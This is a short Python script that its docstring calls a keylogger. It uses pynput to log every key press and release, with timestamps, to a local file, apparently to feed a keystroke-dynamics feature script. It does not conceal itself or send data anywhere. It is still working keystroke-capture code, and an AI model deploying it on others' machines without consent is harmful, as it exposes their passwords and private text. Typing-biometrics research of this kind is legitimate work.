'''
This code is a keylogger.
It runs in the background once this file is executed
The keylogger will stop when the command prompt is closed
Key press and key release events will be logged in 'key_logs.txt' file
This file will be created in the same directory as the 'keylogger.py' code
Use 'keystroke_dynamics.py' to generate keystroke features

Reference - https://gist.github.com/jamesgeorge007/cb68fedd8419721f6f4c7a7643181974

'''

import logging
from datetime import datetime
from pynput.keyboard import Key, Listener

#making a new log file
log_dir=""
file=log_dir+'key_logs.txt'

timing = datetime.now().time()

#root logger is configured, level threshold is NONSET and format includes the context information to be added to the log file - 'file'
logging.basicConfig(filename=file, level=logging.NOTSET, format='%(asctime)s - %(message)s')
#logging.basicConfig(filename=file, level=logging.NOTSET, format = f'{datetime.now()} - %(message)s')

#Key Press Event
def Key_Event_Down(Keyinfo):
    logging.info(str(Keyinfo))

#Key Release Event
def Key_Event_Up(Keyinfo):
    logging.info(str(Keyinfo))

#listener to listen to key up and key down events
with Listener(on_press = Key_Event_Down,on_release=Key_Event_Up) as listnr:
     listnr.join()

